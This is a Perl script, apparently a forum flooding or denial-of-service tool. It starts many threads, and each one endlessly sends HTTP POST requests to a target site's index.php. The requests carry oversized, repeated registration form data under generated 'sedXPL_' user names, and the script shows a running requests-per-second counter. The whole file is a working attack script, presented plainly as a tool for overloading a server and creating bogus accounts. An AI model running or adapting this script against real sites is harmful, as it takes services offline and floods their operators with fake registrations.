#!/usr/local/bin/perl -w

use Thread;
use IO::Socket;
printf "\ec";

my @arr = ();
($threadmax, $serv, $path) = @ARGV;

$path = "http://$serv" if (!$path);

for ($i=0; $i < $threadmax + 1; $i++) {
    push @arr, Thread->new(\&function, $i);
}
for ($x=0; $x < $threadmax + 1; $x++) {
    @arr[$x]->join();
}

sub function {
    my $param = shift;
    if ($param == $threadmax) {
        print("Started $threadmax Theads...\n");
        $op = 1;
        $pps = 1;
        $st = time();
    }

    
    $rand=rand(10);
    chop ($path);
    for($i=1;$i != 0;$i++) {
        $name="sedXPL_".$rand.$i;
        $data = "act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1&";
        $get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "80") || die "Cannot Connect Host, it's can be beacuse the host dosed";
        print $get1 "POST ".$path."index.php HTTP/1.0\n";
        print $get1 "Host: ".$serv."\n";
        print $get1 "Content-Type: application/x-www-form-urlencoded\n";
        print $get1 "Content-Length: ".(length $data)."\n\n";
        print $get1 $data;
        if ($param == $threadmax) {
            if (time() - $st > 0.5) {
                $st = time();
                $pps = ($i * $threadmax) - $op;
                $op = $i * $threadmax;
            }
            $datastr = " Requests " . ($i * $threadmax) .  "| $pps/s | " . (int $pps / $threadmax) . "/PTs     ";
            $string = "";
            for ($x=0; $x < length $datastr; $x++) {
                $string = $string . "\b";
            }
            syswrite STDOUT,  $datastr . $string;
        }
    }

    print("Thread $param ends\n");
}
